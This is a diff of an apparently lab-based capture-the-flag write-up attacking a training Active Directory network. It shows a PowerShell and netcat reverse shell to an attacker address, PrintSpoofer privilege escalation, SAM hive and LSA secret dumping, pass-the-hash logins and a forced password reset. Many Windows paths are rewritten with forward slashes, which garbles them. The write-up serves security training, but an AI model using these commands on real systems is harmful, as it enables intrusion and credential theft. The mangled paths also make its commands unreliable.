@@ -511,7 +511,7 @@ xp_cmdshell 'whoami'
 ```
 and successfully get RCE:
 ```
-nt service\mssql$sqlexpress
+nt service/mssql$sqlexpress
 ```
 We now run a privilege check with whoami /priv and get:
 ```
@@ -530,8 +530,8 @@ Now that we know we have SeImpersonate privilege and that the Windows, we can us
 ```
 PrintSpoofer.exe -i -c cmd
 
-C:\WINDOWS\system32>whoami
-nt authority\system
+C:/WINDOWS/system32>whoami
+nt authority/system
 ```
 We download PrintSpoofer64.exe and nc64.exe as the 64-bit distribution, as a simple check with the command 
 "wmic os get osarchitecture" lets us know that the DEV machine is 64bit. We then upload these files in file-management and see that they are located in http://172.16.8.20/Portals/0/Templates/ but we still do not know the exact file path of these files. 
@@ -543,21 +543,21 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.
 ```
 Now we successfully have a PS reverse shell. We can use a powershell Get-ChildItem command to see where our uploaded files PrintSpoofer.exe and nc64.exe went by searching the entire directory:
 ```
-Get-ChildItem -Path C:\ -Filter nc64.exe -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:/ -Filter nc64.exe -Recurse -ErrorAction SilentlyContinue
 ```
 We now see that they are all located here:
 ```
-C:\DotNetNuke\Portals\0\Templates
+C:/DotNetNuke/Portals/0/Templates
 ```
 We now can cd to the directory and launch PrintSpoofer64.exe to run an elevated SYSTEM command, and we can also choose to run an elevated SYSTEM command that gives us a full SYSTEM reverse shell using nc64.exe:
 ```
-c:\DotNetNuke\Portals\0\Templates\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\Templates\nc64.exe 172.16.8.120 4442 -e cmd"
+c:/DotNetNuke/Portals/0/Templates/PrintSpoofer64.exe -c "c:/DotNetNuke/Portals/0/Templates/nc64.exe 172.16.8.120 4442 -e cmd"
 ```
 We now successfully get SYSTEM privilege on the ACADEMY-AEN-DEV machine. After getting SYSTEM, we extract the 3 registry hives:
 ```
-reg save HKLM\SYSTEM SYSTEM.SAVE
-reg save HKLM\SECURITY SECURITY.SAVE
-reg save HKLM\SAM SAM.SAVE
+reg save HKLM/SYSTEM SYSTEM.SAVE
+reg save HKLM/SECURITY SECURITY.SAVE
+reg save HKLM/SAM SAM.SAVE
 ```
 After saving this to the Templates directory, we do not see the files on the file management system which means that the file extension .SAVE needs to be allowed in the Security settings in order for the user to see the files. After adding .SAVE, we now can see the registry hives and download them to our attack box. 
 
@@ -593,7 +593,7 @@ proxychains netexec smb 172.16.8.20 --local-auth -u Administrator -H 0e20798f695
 [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:445  ...  OK
 SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
 [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:445  ...  OK
-SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\Administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV/Administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
 ```
 I tried installing crackmapexec first, but no matter which way I installed it or ran the command it would not work, possibly because the repository is abandoned and left unupdated. I found NetExec which seems to be a working updated fork. 
 
@@ -603,17 +603,17 @@ proxychains evil-winrm -i 172.16.8.20 -u Administrator -H 0e20798f695ab0d04bc138
 ```
 Now that we have SYSTEM, we can do a Windows find command to search for flag files:
 ```
-Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*flag*" }
+Get-ChildItem -Path C:/ -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*flag*" }
 
-C:\Users\Administrator\Desktop
-C:\Share
+C:/Users/Administrator/Desktop
+C:/Share
 ```
-Then, we finally get the 15th flag from C:\Users\Administrator\Desktop:
+Then, we finally get the 15th flag from C:/Users/Administrator/Desktop:
 ```
 K33p_0n_sp00fing!
 ```
 ### Sixteenth Flag:
-Easy flag, it is located at C:\Share\flag.txt.
+Easy flag, it is located at C:/Share/flag.txt.
 ```
 bf22a1d0acfca4af517e1417a80e92d1
 ```
@@ -623,15 +623,15 @@ From the hashdump, we found (Unknown User):Gr8hambino!, we potentially can find 
 ```
 SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
 [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.8.20:445  ...  OK
-SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\Administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV/Administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
 SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] Dumping LSA secrets
 SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
-SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:aes256-cts-hmac-sha1-96:6791ba2d6b86986e2aecd4c1c06980b52840cbc3242f42cbe9d57caf02761fa7
-SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:aes128-cts-hmac-sha1-96:3f91ba89035055afb5595488e66b8909
-SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:des-cbc-md5:94f8e3160113235d
-SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:plain_password_hex:1e7be7b31d2e60c85ce045e6baaaa927e69245d6227ac9126972e94778d24b61c123220104ecfd244291f7607a4160a7f0501cc2d41ea8951712f502f0c269c616777d6967480098f5daf64cffe22bbbd191dc4ae21ea7120639c62ffbff0b441c8a3f439cf74a857412595e08d05ebeab855d79811b89ebd6b735cafcce0b78ec0cf185095ab8e868455de6630b2be07489b045aee896b76e5a6eebd18d4712d285389bffe42a29168d9770ec831281d06002345ac89d3decc8f29d25864704e5b6cd4d05f1992aeca2aa02baf0b23167e2062d443fb2bb54a612bd91412054c5ea3f557376df8225b0790179fa56ec
-SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:aad3b435b51404eeaad3b435b51404ee:7f4bdd5132d1125539db0398538eb8b3:::
-SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\hporter:Gr8hambino!
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT/ACADEMY-AEN-DEV$:aes256-cts-hmac-sha1-96:6791ba2d6b86986e2aecd4c1c06980b52840cbc3242f42cbe9d57caf02761fa7
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT/ACADEMY-AEN-DEV$:aes128-cts-hmac-sha1-96:3f91ba89035055afb5595488e66b8909
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT/ACADEMY-AEN-DEV$:des-cbc-md5:94f8e3160113235d
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT/ACADEMY-AEN-DEV$:plain_password_hex:1e7be7b31d2e60c85ce045e6baaaa927e69245d6227ac9126972e94778d24b61c123220104ecfd244291f7607a4160a7f0501cc2d41ea8951712f502f0c269c616777d6967480098f5daf64cffe22bbbd191dc4ae21ea7120639c62ffbff0b441c8a3f439cf74a857412595e08d05ebeab855d79811b89ebd6b735cafcce0b78ec0cf185095ab8e868455de6630b2be07489b045aee896b76e5a6eebd18d4712d285389bffe42a29168d9770ec831281d06002345ac89d3decc8f29d25864704e5b6cd4d05f1992aeca2aa02baf0b23167e2062d443fb2bb54a612bd91412054c5ea3f557376df8225b0790179fa56ec
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT/ACADEMY-AEN-DEV$:aad3b435b51404eeaad3b435b51404ee:7f4bdd5132d1125539db0398538eb8b3:::
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT/hporter:Gr8hambino!
 SMB         172.16.8.20     445    ACADEMY-AEN-DEV  dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
 dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
 ```
@@ -639,9 +639,9 @@ Where we can see hporter:Gr8hambino!
 
 Since we have a local administrator account on DEV01, we now can use Sharphound to map out the data from the AD domain for the Bloodhound tool so that we can visualize AD rights and memberships to check for more opportunities in privilege escalation, as well as possibly find how the hporter user credentials can be used in this AD domain. We can use Evil-WinRM to upload Sharphound.exe and create a zip file for BloodHound to enumerate the domain:
 ```
-upload /path/to/local/file C:\Users\victim\Desktop\file.exe
+upload /path/to/local/file C:/Users/victim/Desktop/file.exe
 ./SharpHound.exe -c All
-download C:\Users\victim\Desktop\file.zip /path/to/local/destination
+download C:/Users/victim/Desktop/file.zip /path/to/local/destination
 ```
 We then download the zip file to our local attack box. 
 If you have not downloaded BloodHound, there are steps on Github that may seem a bit complicated. I am on Ubuntu Linux, and the easiest way for me was to install Docker Desktop on my OS and have the container run on my localhost at port 8080. There, we can access our BloodHound instance and insert all of the files contained in the Sharphound zip file. For more information you can go to https://github.com/SpecterOps/BloodHound.
@@ -652,13 +652,184 @@ We now try the credentials with xfreerdp:
 ```
 proxychains xfreerdp /v:172.16.8.20 /u:hporter /p:Gr8hambino! /drive:(drivename),"/home/(drivename)"
 ```
-After this, we can cd into the C:\share directory and run the command "net use" to make our attack box's drive accessible. Now we can copy files from our drive using the copy command:
+After this, we can cd into the C:/share directory and run the command "net use" to make our attack box's drive accessible. Now we can copy files from our drive using the copy command:
 ```
-C:\Share copy \\TSCLIENT\home\file
+C:/Share copy //TSCLIENT/home/file
 ```
 On Outbound Execution Privileges, we see that hporter has the ForceChangePassword permission over the user ssmalls which is in the itadmins group, giving us a possible privilege escalation. We can abuse the ForceChangePassword permission with the PowerView command after copying PowerView to the DEV01 host through xfreerdp /drive:
 ```
 Import-Module PowerView.ps1
-Set-DomainUserPassword -Identity (domainusername) -AccountPassword (ConvertTo-SecureString 'Password123@' -AsPlainText -Force ) -Verbose
+Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Password123@' -AsPlainText -Force ) -Verbose
 ```
 We don't immediately see anything from the ssmalls user, so we can try running the Snaffler tool to enumerate any file shares that are readable from the computers in AD. 
+
+We see that we have available shares from the domain controller:
+```
+[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Black}<//ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL/ADMIN$>()
+[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Green}<//ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL/ADMIN$>(R) Remote Admin
+[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Black}<//ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL/C$>()
+[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Green}<//ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL/C$>(R) Default share
+[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Green}<//DC01.INLANEFREIGHT.LOCAL/Department Shares>(R) Share for department users
+[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Green}<//DC01.INLANEFREIGHT.LOCAL/NETLOGON>(R) Logon server share
+[INLANEFREIGHT/hporter@ACADEMY-AEN-DEV01] 2025-04-03 20:07:45Z [Share] {Green}<//DC01.INLANEFREIGHT.LOCAL/SYSVOL>(R) Logon server share
+``
+We see an interesting share on the domain controller 172.16.8.3 that is accessible with our hporter account: //DC01.INLANEFREIGHT.LOCAL/Department Shares.
+We then can use netexec's spider_plus module to attempt to enumerate all of the shares' contents:
+```
+proxychains netexec smb 172.16.8.3 -u ssmalls -p Password123@ -M spider_plus --share 'Department Shares'
+Saved share-file metadata to "/home/kchen/.nxc/modules/nxc_spider_plus/172.16.8.3.json"
+cat /home/kchen/.nxc/modules/nxc_spider_plus/172.16.8.3.json
+
+{
+    "Department Shares": {
+        "IT/Private/Development/SQL Express Backup.ps1": {
+            "atime_epoch": "2022-06-01 14:34:16",
+            "ctime_epoch": "2022-06-01 14:34:16",
+            "mtime_epoch": "2022-06-01 14:35:16",
+            "size": "3.91 KB"
+        }
+    },
+    "NETLOGON": {
+        "adum.vbs": {
+            "atime_epoch": "2022-06-01 14:34:41",
+            "ctime_epoch": "2022-06-01 14:34:41",
+            "mtime_epoch": "2022-06-01 14:34:39",
+            "size": "32.15 KB"
+        }
+    },
+    "SYSVOL": {
+        "INLANEFREIGHT.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
+            "atime_epoch": "2022-06-01 14:17:55",
+            "ctime_epoch": "2022-06-01 14:11:08",
+            "mtime_epoch": "2022-06-01 14:17:55",
+            "size": "22 B"
+        },
+        "INLANEFREIGHT.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
+            "atime_epoch": "2022-06-01 14:17:55",
+            "ctime_epoch": "2022-06-01 14:11:08",
+            "mtime_epoch": "2022-06-01 14:17:55",
+            "size": "1.07 KB"
+        },
+        "INLANEFREIGHT.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
+            "atime_epoch": "2022-06-01 14:11:08",
+            "ctime_epoch": "2022-06-01 14:11:08",
+            "mtime_epoch": "2022-06-01 14:11:12",
+            "size": "22 B"
+        },
+        "INLANEFREIGHT.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
+            "atime_epoch": "2022-06-01 14:11:09",
+            "ctime_epoch": "2022-06-01 14:11:09",
+            "mtime_epoch": "2022-06-01 14:11:12",
+            "size": "3.68 KB"
+        },
+        "INLANEFREIGHT.LOCAL/scripts/adum.vbs": {
+            "atime_epoch": "2022-06-01 14:34:41",
+            "ctime_epoch": "2022-06-01 14:34:41",
+            "mtime_epoch": "2022-06-01 14:34:39",
+            "size": "32.15 KB"
+        }
+    }
+}
+```
+We see that there is a SQL Express Backup ps1 file in the path "//DC01.INLANEFREIGHT.LOCAL/Department Shares/IT/Private/Development/SQL Express Backup.ps1"
+
+We can then use smbclient to connect to the share with the user ssmalls:
+```
+proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'
+```
+Cd to the correct directory, and then:
+```
+smb: \IT\Private\Development\> get SQL Express Backup.ps1 
+```
+Here are the contents of the file:
+```
+$serverName = ".\SQLExpress"
+$backupDirectory = "D:\backupSQL"
+$daysToStoreDailyBackups = 7
+$daysToStoreWeeklyBackups = 28
+$monthsToStoreMonthlyBackups = 3
+
+[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SMO") | Out-Null
+[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoExtended") | Out-Null
+[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo") | Out-Null
+[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum") | Out-Null
+ 
+$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
+$mySrvConn.ServerInstance=$serverName
+$mySrvConn.LoginSecure = $false
+$mySrvConn.Login = "backupadm"
+$mySrvConn.Password = "!qazXSW@"
+
+$server = new-object Microsoft.SqlServer.Management.SMO.Server($mySrvConn)
+
+$dbs = $server.Databases
+$startDate = (Get-Date)
+"$startDate"
+
+Get-ChildItem "$backupDirectory\*_daily.bak" |? { $_.lastwritetime -le (Get-Date).AddDays(-$daysToStoreDailyBackups)} |% {Remove-Item $_ -force }
+"removed all previous daily backups older than $daysToStoreDailyBackups days"
+
+foreach ($database in $dbs | where { $_.IsSystemObject -eq $False})
+{
+    $dbName = $database.Name      
+
+    $timestamp = Get-Date -format yyyy-MM-dd-HHmmss
+    $targetPath = $backupDirectory + "\" + $dbName + "_" + $timestamp + "_daily.bak"
+
+    $smoBackup = New-Object ("Microsoft.SqlServer.Management.Smo.Backup")
+    $smoBackup.Action = "Database"
+    $smoBackup.BackupSetDescription = "Full Backup of " + $dbName
+    $smoBackup.BackupSetName = $dbName + " Backup"
+    $smoBackup.Database = $dbName
+    $smoBackup.MediaDescription = "Disk"
+    $smoBackup.Devices.AddDevice($targetPath, "File")
+    $smoBackup.SqlBackup($server) 
+    "backed up $dbName ($serverName) to $targetPath"               
+}
+
+if([Int] (Get-Date).DayOfWeek -eq 0)
+{
+    Get-ChildItem "$backupDirectory\*_weekly.bak" |? { $_.lastwritetime -le (Get-Date).AddDays(-$daysToStoreWeeklyBackups)} |% {Remove-Item $_ -force }
+    "removed all previous daily backups older than $daysToStoreWeeklyBackups days"
+
+    foreach ($database in $dbs | where { $_.IsSystemObject -eq $False})
+    {
+        $dbName = $database.Name      
+
+        $timestamp = Get-Date -format yyyy-MM-dd-HHmmss
+        $targetPath = $backupDirectory + "\" + $dbName + "_" + $timestamp + "_weekly.bak"
+
+        $smoBackup = New-Object ("Microsoft.SqlServer.Management.Smo.Backup")
+        $smoBackup.Action = "Database"
+        $smoBackup.BackupSetDescription = "Full Backup of " + $dbName
+        $smoBackup.BackupSetName = $dbName + " Backup"
+        $smoBackup.Database = $dbName
+        $smoBackup.MediaDescription = "Disk"
+        $smoBackup.Devices.AddDevice($targetPath, "File")
+        $smoBackup.SqlBackup($server) 
+        "backed up $dbName ($serverName) to $targetPath"                 
+    }
+}
+
+if([Int] (Get-Date).Day -eq 1)
+{
+    Get-ChildItem "$backupDirectory\*_monthly.bak" |? { $_.lastwritetime -le (Get-Date).AddMonths(-$monthsToStoreMonthlyBackups)} |% {Remove-Item $_ -force }
+    "removed all previous monthly backups older than $monthsToStoreMonthlyBackups days"
+
+    foreach ($database in $dbs | where { $_.IsSystemObject -eq $False})
+    {
+        $dbName = $database.Name      
+
+        $timestamp = Get-Date -format yyyy-MM-dd-HHmmss
+        $targetPath = $backupDirectory + "\" + $dbName + "_" + $timestamp + "_monthly.bak"
+
+        $smoBackup = New-Object ("Microsoft.SqlServer.Management.Smo.Backup")
+        $smoBackup.Action = "Database"
+        $smoBackup.BackupSetDescription = "Full Backup of " + $dbName
+        $smoBackup.BackupSetName = $dbName + " Backup"
+        $smoBackup.Database = $dbName
+        $smoBackup.MediaDescription = "Disk"
+        $smoBackup.Devices.AddDevice($targetPath, "File")
+        $smoBackup.SqlBackup($server) 
+        "backed up $dbName ($serverName) to $targetPath"S
+```
